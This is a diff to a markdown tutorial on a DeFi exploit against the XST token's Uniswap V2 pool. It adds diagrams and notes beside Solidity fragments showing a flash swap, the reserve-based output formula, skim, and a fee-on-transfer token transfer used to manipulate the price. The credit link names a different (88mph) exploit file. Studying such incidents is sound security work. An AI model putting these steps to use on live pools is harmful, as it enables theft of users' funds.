@@ -30,6 +30,8 @@
 
 
 
+![XTS Image](../images/XTS/label.drawio.png)
+
 ```solidity
         amount = WETH.balanceOf(address(Pair2));
         Pair1.swap(amount * 2, 0, address(this), " ");
@@ -41,16 +43,24 @@ uint256 amountSellWETH = WETH.balanceOf(address(this));
 (uint256 reserve0, uint256 reserve1,) = Pair2.getReserves(); // r0 : XST r1 WETH
 ```
 
+![XTS Image](../images/XTS/before.drawio.png)
 
-//fpormula image here
 
+
+
+### calculate swap
+
+![XTS Image](../images/XTS/para1.drawio.png)
+
+![XTS Image](../images/XTS/formula.drawio.png)
 ```solidity
   uint256 amountOutXST = amountSellWETH * 997 * reserve0 / (reserve1 * 1000 + amountSellWETH * 997);
 ```
 
 
-//parameter image here
 
+
+swap ST tokens for WETH tokens in the liquidity pool of Uniswap XST
 
 ```solidity
   WETH.transfer(address(Pair2), amountSellWETH);
@@ -61,7 +71,7 @@ uint256 amountSellWETH = WETH.balanceOf(address(this));
 #### skim
 
 The skim function in Uniswap V2 is used to claim accumulated tokens from a liquidity pool without removing liquidity. 
-It's often used to retrieve additional tokens that have been accumulated due to various operations, such as swaps.
+It's often used to retrieve additional tokens accumulated due to various operations, such as swaps.
    
 
 ```solidity
@@ -74,11 +84,13 @@ It's often used to retrieve additional tokens that have been accumulated due to 
 ```
 
 
+After skimming the tokens we transfer the XST tokens to the liquitiy pool, wich allows us to manipulate the price
+
+
 ```solidity
    // sell XST to WETH
           // XST is SupportFeeOn Token
           XST.transfer(address(Pair2), XST.balanceOf(address(this)));
-
 ```
 
 
@@ -86,9 +98,16 @@ It's often used to retrieve additional tokens that have been accumulated due to 
 
 
 
+![XTS Image](../images/XTS/liq.drawio.png)
 
 
-![euler Image](../images/euler/euler.png)
+
+
+
+![XTS Image](../images/XTS/profit.drawio.png)
+
+
+
 
 
 **Code provided by:** [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/88mph_exp.sol)
